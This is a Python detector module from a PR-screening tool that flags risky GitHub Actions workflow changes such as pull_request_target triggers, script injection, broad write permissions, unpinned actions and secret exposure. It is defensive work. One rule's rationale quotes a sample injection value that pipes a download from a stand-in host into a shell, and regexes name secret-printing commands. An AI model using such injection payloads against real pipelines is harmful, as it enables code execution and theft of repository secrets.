"""Changes to GitHub Actions workflows that weaken the pipeline or expose its secrets.

Workflows run with repository tokens and secrets, so a small edit here can matter more than a
large change to application code.
"""

from __future__ import annotations

import re
from collections.abc import Iterator

from prscreen.detectors import Detector
from prscreen.detectors._common import is_comment, is_workflow
from prscreen.diff import ChangeKind, Diff, DiffLine, FileChange
from prscreen.models import Category, Confidence, Finding, Rule, Severity

PR_TARGET = Rule(
    id="CI001",
    title="Workflow runs on pull_request_target",
    category=Category.CI,
    severity=Severity.MEDIUM,
    confidence=Confidence.HIGH,
    rationale=(
        "pull_request_target runs with the base repository's secrets and a write token, even for "
        "pull requests from forks. It is only safe if the job never builds, runs or trusts code "
        "from the pull request."
    ),
    benign="Labelling, triage and welcome-comment workflows use it without touching PR code.",
)
PR_HEAD_CHECKOUT = Rule(
    id="CI002",
    title="Workflow checks out pull request code",
    category=Category.CI,
    severity=Severity.MEDIUM,
    confidence=Confidence.MEDIUM,
    rationale=(
        "Checking out the PR's head commit in a privileged workflow (pull_request_target or "
        "workflow_run) lets anyone who opens a PR run code with the repository's secrets: the "
        "'pwn request' pattern."
    ),
    benign="Harmless in a plain pull_request workflow, which has no secrets for fork PRs.",
)
SCRIPT_INJECTION = Rule(
    id="CI003",
    title="Untrusted input expanded inside a script",
    category=Category.CI,
    severity=Severity.HIGH,
    confidence=Confidence.HIGH,
    rationale=(
        "${{ }} expressions are pasted into the script before it runs. A PR title, branch name, "
        'issue body or commit message such as  a"; curl evil.sh | sh; "  becomes shell code. Pass the '
        'value through env: and use "$VAR" instead.'
    ),
    benign="None that make it safe in run: or script:; moving the value to env: fixes it.",
)
WRITE_PERMISSIONS = Rule(
    id="CI004",
    title="Workflow token gets write permissions",
    category=Category.CI,
    severity=Severity.LOW,
    confidence=Confidence.MEDIUM,
    rationale=(
        "Every step in the job, including third-party actions, can use the token. Write access "
        "lets a compromised step push code, publish packages or edit releases."
    ),
    benign="Release, deploy and labelling jobs need specific write scopes. Grant them per job.",
)
UNPINNED_ACTION = Rule(
    id="CI005",
    title="Third-party action not pinned to a commit",
    category=Category.CI,
    severity=Severity.LOW,
    confidence=Confidence.HIGH,
    rationale=(
        "Tags and branches can be moved to new code at any time; in 2025 the tj-actions/changed-files "
        "tags were repointed to code that dumped CI secrets. Pinning to a full commit SHA freezes "
        "what runs."
    ),
    benign="Common practice for trusted publishers; Dependabot can keep SHA pins up to date.",
)
SECRET_EXPOSURE = Rule(
    id="CI006",
    title="Secrets exposed in workflow output",
    category=Category.CI,
    severity=Severity.MEDIUM,
    confidence=Confidence.MEDIUM,
    rationale=(
        "Printing secrets, serialising the whole secrets context or re-enabling deprecated commands "
        "can put credentials into logs and artifacts, where GitHub's masking does not always catch "
        "encoded or partial values."
    ),
    benign="Debugging steps sometimes echo values temporarily; they should not be merged.",
)
SELF_HOSTED = Rule(
    id="CI007",
    title="Job runs on a self-hosted runner",
    category=Category.CI,
    severity=Severity.LOW,
    confidence=Confidence.MEDIUM,
    rationale=(
        "Self-hosted runners are not wiped between jobs. If pull requests can trigger the job, PR "
        "code can persist on the machine and reach whatever network it is on."
    ),
    benign="Normal for private repositories and for jobs that never run on PRs from forks.",
)

_KEY_RE = re.compile(r"^\s*(?:-\s*)?([A-Za-z_][\w-]*)\s*:")
_UNTRUSTED_RE = re.compile(
    r"\$\{\{[^}]{0,200}\b(?:github\.head_ref|github\.event\.(?:"
    r"issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)"
    r"|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)"
    r"|pages\.[^}]{0,200}\.page_name|(?:head_commit|commits\[?[^}]{0,200}?\]?)\.(?:message|author\.(?:email|name))"
    r"|workflow_run\.(?:head_branch|head_commit\.message|display_title)"
    r"))[^}]{0,200}\}\}"
)
_INLINE_RUN_RE = re.compile(r"[{,]\s*[\"']?(?:run|script)[\"']?\s*:")
_PR_TARGET_RE = re.compile(r"\bpull_request_target\b")
_WORKFLOW_RUN_RE = re.compile(r"^\s*(?:-\s*)?workflow_run\s*:")
_HEAD_REF_RE = re.compile(
    r"\$\{\{\s*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref"
    r"|github\.event\.workflow_run\.head_(?:sha|branch))\s*\}\}|refs/pull/"
)
_WRITE_ALL_RE = re.compile(r"^\s*permissions\s*:\s*write-all\b")
_WRITE_SCOPE_RE = re.compile(
    r"^\s*(contents|actions|packages|pull-requests|issues|security-events|deployments|statuses|checks|"
    r"pages|repository-projects|attestations|discussions)\s*:\s*write\b"
)
_USES_RE = re.compile(r"^\s*(?:-\s*)?uses\s*:\s*[\"']?([^\s\"'#]+)")
_SHA_RE = re.compile(r"^[0-9a-f]{40}$")
_TRUSTED_OWNERS = frozenset({"actions", "github"})
_SECRET_EXPOSURE: tuple[tuple[re.Pattern[str], str, Severity], ...] = (
    (re.compile(r"toJSON\(\s*secrets\s*\)"), "Serialises every secret at once.", Severity.HIGH),
    (
        re.compile(r"\b(?:echo|printf|cat|tee|print)\b[^#]{0,300}\$\{\{\s*secrets\."),
        "Prints a secret.",
        Severity.MEDIUM,
    ),
    (
        re.compile(r"ACTIONS_ALLOW_UNSECURE_COMMANDS"),
        "Re-enables set-env/add-path, which allow injection.",
        Severity.MEDIUM,
    ),
    (re.compile(r"^\s*secrets\s*:\s*inherit\b"), "Passes all secrets to a called workflow.", Severity.LOW),
)
_SELF_HOSTED_RE = re.compile(r"^\s*runs-on\s*:.{0,300}\bself-hosted\b")


class WorkflowDetector(Detector):
    name = "workflows"
    rules = (PR_TARGET, PR_HEAD_CHECKOUT, SCRIPT_INJECTION, WRITE_PERMISSIONS, UNPINNED_ACTION,
             SECRET_EXPOSURE, SELF_HOSTED)  # fmt: skip

    def scan(self, diff: Diff) -> Iterator[Finding]:
        for change in diff.files:
            if change.binary or change.kind is ChangeKind.DELETED or not is_workflow(change.path):
                continue
            lines = [line for line in change.added if not is_comment(line.text)]
            privileged = any(_PR_TARGET_RE.search(x.text) or _WORKFLOW_RUN_RE.match(x.text) for x in lines)
            for line in lines:
                yield from self._line(change, line, privileged)

    def _line(self, change: FileChange, line: DiffLine, privileged: bool) -> Iterator[Finding]:
        text, path, no = line.text, change.path, line.number
        key_match = _KEY_RE.match(text)
        key = key_match[1] if key_match else None

        if _PR_TARGET_RE.search(text):
            yield PR_TARGET.finding(path, no, text, "Adds the pull_request_target trigger.")
        if _HEAD_REF_RE.search(text) and (key == "ref" or re.search(r"\bgit\s+(?:fetch|checkout)\b", text)):
            yield PR_HEAD_CHECKOUT.finding(
                path, no, text,
                "Checks out the PR's own commit"
                + (" in a workflow that also runs on pull_request_target or workflow_run."
                   if privileged else "."),
                severity=Severity.HIGH if privileged else None,
                confidence=Confidence.HIGH if privileged else None,
            )  # fmt: skip
        # Lines inside a run: block have no key of their own. Other keys (env:, with:) receive the
        # value as data, which is the safe pattern.
        # Flow-style YAML ({ run: "..." }) puts the key mid-line, so look before the expression too.
        if (match := _UNTRUSTED_RE.search(text)) and (
            key is None or key in ("run", "script") or _INLINE_RUN_RE.search(text, 0, match.start())
        ):
            yield SCRIPT_INJECTION.finding(path, no, text, f"Expands {match[0]} directly into code.")
        if _WRITE_ALL_RE.match(text):
            yield WRITE_PERMISSIONS.finding(
                path, no, text, "Grants write access to every scope.", severity=Severity.MEDIUM,
                confidence=Confidence.HIGH,
            )  # fmt: skip
        elif match := _WRITE_SCOPE_RE.match(text):
            yield WRITE_PERMISSIONS.finding(path, no, text, f"Grants {match[1]}: write.")
        if match := _USES_RE.match(text):
            yield from self._uses(change, line, match[1])
        for pattern, detail, severity in _SECRET_EXPOSURE:
            if pattern.search(text):
                yield SECRET_EXPOSURE.finding(path, no, text, detail, severity=severity)
                break
        if _SELF_HOSTED_RE.match(text):
            yield SELF_HOSTED.finding(path, no, text, "Runs on a machine that keeps state between jobs.")

    def _uses(self, change: FileChange, line: DiffLine, target: str) -> Iterator[Finding]:
        if target.startswith("./"):
            return
        if target.startswith("docker://"):
            if "@sha256:" not in target:
                yield UNPINNED_ACTION.finding(
                    change.path, line.number, line.text, "Runs a container image by tag, not by digest."
                )
            return
        name, _, ref = target.partition("@")
        if name.split("/", 1)[0].lower() in _TRUSTED_OWNERS or _SHA_RE.match(ref):
            return
        detail = f"'{name}' is referenced by '{ref}'" if ref else f"'{name}' has no version at all"
        yield UNPINNED_ACTION.finding(change.path, line.number, line.text, detail + ", which can change.")
